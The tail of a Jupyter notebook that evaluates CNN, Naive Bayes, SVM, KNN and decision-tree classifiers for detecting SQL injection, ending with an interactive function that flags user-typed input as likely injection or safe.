            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from keras.models import load_model\n",
        "import pickle\n",
        "\n",
        "model.save('my_model_cnn.h5')\n",
        "with open('vectorizer_cnn', 'wb') as fin:\n",
        "    pickle.dump(vectorizer, fin)"
      ],
      "metadata": {
        "id": "iH9Xa7eMcX6b"
      },
      "execution_count": 227,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def accuracy_function(tp,tn,fp,fn):\n",
        "    \n",
        "    accuracy = (tp+tn) / (tp+tn+fp+fn)\n",
        "    \n",
        "    return accuracy"
      ],
      "metadata": {
        "id": "_vUy5kEYcZ4V"
      },
      "execution_count": 228,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def precision_function(tp,fp):\n",
        "    \n",
        "    precision = tp / (tp+fp)\n",
        "    \n",
        "    return precision"
      ],
      "metadata": {
        "id": "wHJmxU-bcbUj"
      },
      "execution_count": 229,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def recall_function(tp,fn):\n",
        "    \n",
        "    recall=tp / (tp+fn)\n",
        "    \n",
        "    return recall"
      ],
      "metadata": {
        "id": "4s3O2xJNccPc"
      },
      "execution_count": 230,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def confusion_matrix(truth,predicted):\n",
        "    \n",
        "    true_positive = 0\n",
        "    true_negative = 0\n",
        "    false_positive = 0\n",
        "    false_negative = 0\n",
        "    \n",
        "    for true,pred in zip(truth,predicted):\n",
        "        \n",
        "        if true == 1:\n",
        "            if pred == true:\n",
        "                true_positive += 1\n",
        "            elif pred != true:\n",
        "                false_negative += 1\n",
        "\n",
        "        elif true == 0:\n",
        "            if pred == true:\n",
        "                true_negative += 1\n",
        "            elif pred != true:\n",
        "                false_positive += 1\n",
        "            \n",
        "    accuracy=accuracy_function(true_positive, true_negative, false_positive, false_negative)\n",
        "    precision=precision_function(true_positive, false_positive)\n",
        "    recall=recall_function(true_positive, false_negative)\n",
        "    \n",
        "    return (accuracy,\n",
        "            precision,\n",
        "           recall)"
      ],
      "metadata": {
        "id": "T7XIZgyRcdcn"
      },
      "execution_count": 231,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "accuracy,precision,recall=confusion_matrix(y_test,pred)"
      ],
      "metadata": {
        "id": "Lx7P-XN6cdil"
      },
      "execution_count": 232,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "print(\" For CNN \\n Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5QKWRXdqcgUz",
        "outputId": "abb015eb-ad88-4edd-c5bc-040cec944b35"
      },
      "execution_count": 233,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " For CNN \n",
            " Accuracy : 0.9473684210526315 \n",
            " Precision : 0.8526011560693642 \n",
            " Recall : 0.9735973597359736\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "accuracy,precision,recall=confusion_matrix(y_test,pred_gnb)\n",
        "print(\" For Naive Bayes Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6hqKHaznchpI",
        "outputId": "8d2a43de-26b4-4fdf-c1b5-e1e7c93463e5"
      },
      "execution_count": 234,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " For Naive Bayes Accuracy : 0.9536128456735058 \n",
            " Precision : 0.8680351906158358 \n",
            " Recall : 0.976897689768977\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "accuracy,precision,recall=confusion_matrix(y_test,pred_svm)\n",
        "print(\" For SVM Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "nak42s8icil8",
        "outputId": "f37d62d2-f256-42de-a4f7-67272b7bd9c0"
      },
      "execution_count": 235,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " For SVM Accuracy : 0.7975022301516503 \n",
            " Precision : 1.0 \n",
            " Recall : 0.2508250825082508\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "accuracy,precision,recall=confusion_matrix(y_test,pred_knn)\n",
        "print(\" For KNN Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "U08ix2o_cj1C",
        "outputId": "3d3844c6-4533-4223-8385-84b8bd96859c"
      },
      "execution_count": 236,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " For KNN Accuracy : 0.856378233719893 \n",
            " Precision : 0.713855421686747 \n",
            " Recall : 0.7821782178217822\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "accuracy,precision,recall=confusion_matrix(y_test,pred_dt)\n",
        "print(\" For Decision Tree Accuracy : {0} \\n Precision : {1} \\n Recall : {2}\".format(accuracy, precision, recall))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "BZHs4y6uck7Y",
        "outputId": "8508e6d2-5982-44cb-af1b-78171233680a"
      },
      "execution_count": 237,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            " For Decision Tree Accuracy : 0.8528099910793934 \n",
            " Precision : 0.6513157894736842 \n",
            " Recall : 0.9801980198019802\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Prediction"
      ],
      "metadata": {
        "id": "fXjxQFcVcnh0"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import keras\n",
        "from keras.models import load_model\n",
        "import pickle\n",
        "\n",
        "\n",
        "mymodel = tf.keras.models.load_model('my_model_cnn.h5')\n",
        "myvectorizer = pickle.load(open(\"vectorizer_cnn\", 'rb'))\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "def clean_data(input_val):\n",
        "\n",
        "    input_val=input_val.replace('\\n', '')\n",
        "    input_val=input_val.replace('%20', ' ')\n",
        "    input_val=input_val.replace('=', ' = ')\n",
        "    input_val=input_val.replace('((', ' (( ')\n",
        "    input_val=input_val.replace('))', ' )) ')\n",
        "    input_val=input_val.replace('(', ' ( ')\n",
        "    input_val=input_val.replace(')', ' ) ')\n",
        "    input_val=input_val.replace('1 ', 'numeric')\n",
        "    input_val=input_val.replace(' 1', 'numeric')\n",
        "    input_val=input_val.replace(\"'1 \", \"'numeric \")\n",
        "    input_val=input_val.replace(\" 1'\", \" numeric'\")\n",
        "    input_val=input_val.replace('1,', 'numeric,')\n",
        "    input_val=input_val.replace(\" 2 \", \" numeric \")\n",
        "    input_val=input_val.replace(' 3 ', ' numeric ')\n",
        "    input_val=input_val.replace(' 3--', ' numeric--')\n",
        "    input_val=input_val.replace(\" 4 \", ' numeric ')\n",
        "    input_val=input_val.replace(\" 5 \", ' numeric ')\n",
        "    input_val=input_val.replace(' 6 ', ' numeric ')\n",
        "    input_val=input_val.replace(\" 7 \", ' numeric ')\n",
        "    input_val=input_val.replace(\" 8 \", ' numeric ')\n",
        "    input_val=input_val.replace('1234', ' numeric ')\n",
        "    input_val=input_val.replace(\"22\", ' numeric ')\n",
        "    input_val=input_val.replace(\" 8 \", ' numeric ')\n",
        "    input_val=input_val.replace(\" 200 \", ' numeric ')\n",
        "    input_val=input_val.replace(\"23 \", ' numeric ')\n",
        "    input_val=input_val.replace('\"1', '\"numeric')\n",
        "    input_val=input_val.replace('1\"', '\"numeric')\n",
        "    input_val=input_val.replace(\"7659\", 'numeric')\n",
        "    input_val=input_val.replace(\" 37 \", ' numeric ')\n",
        "    input_val=input_val.replace(\" 45 \", ' numeric ')\n",
        "\n",
        "    return input_val\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "def predict_sqli_attack():\n",
        "    \n",
        "    repeat=True\n",
        "    \n",
        "    beautify=''\n",
        "    for i in range(20):\n",
        "        beautify+= \"=\"\n",
        "\n",
        "    print(beautify) \n",
        "    input_val=input(\"Give me some data to work on : \")\n",
        "    print(beautify)\n",
        "\n",
        "    \n",
        "    if input_val== '0':\n",
        "        repeat=False\n",
        "    \n",
        "    \n",
        "\n",
        "    input_val=clean_data(input_val)\n",
        "    input_val=[input_val]\n",
        "\n",
        "\n",
        "\n",
        "    input_val=myvectorizer.transform(input_val).toarray()\n",
        "    \n",
        "    input_val.shape=(1,64,64,1)\n",
        "\n",
        "    result=mymodel.predict(input_val)\n",
        "\n",
        "\n",
        "    print(beautify)\n",
        "    \n",
        "    \n",
        "    if repeat == True:\n",
        "        \n",
        "        if result>0.5:\n",
        "            print(\"ALERT :::: This can be SQL injection\")\n",
        "\n",
        "\n",
        "        elif result<=0.5:\n",
        "            print(\"It seems to be safe\")\n",
        "            \n",
        "        print(beautify)\n",
        "            \n",
        "        predict_sqli_attack()\n",
        "            \n",
        "    elif repeat == False:\n",
        "        print( \" Good Bye \")\n"
      ],
      "metadata": {
        "id": "hCc2Pko5cpkd"
      },
      "execution_count": 238,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# check for sql injection cheat sheet\n",
        "\n",
        "predict_sqli_attack()"
      ],
      "metadata": {
        "id": "SuDlmMn6cw0O"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}